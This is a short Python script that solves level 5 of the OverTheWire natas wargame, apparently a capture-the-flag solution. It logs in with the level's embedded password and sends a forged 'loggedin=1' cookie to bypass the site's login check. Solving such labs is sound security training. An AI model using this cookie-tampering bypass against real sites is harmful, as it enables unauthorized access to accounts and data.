import requests

target = 'http://natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq@natas5.natas.labs.overthewire.org'
cookie = {'loggedin':'1'}

r = requests.get(target,cookies=cookie)
if r.status_code != requests.codes.ok :
	print 'Unable to Connect'
else :
	print 'Connected'

print r.cookies
print r.content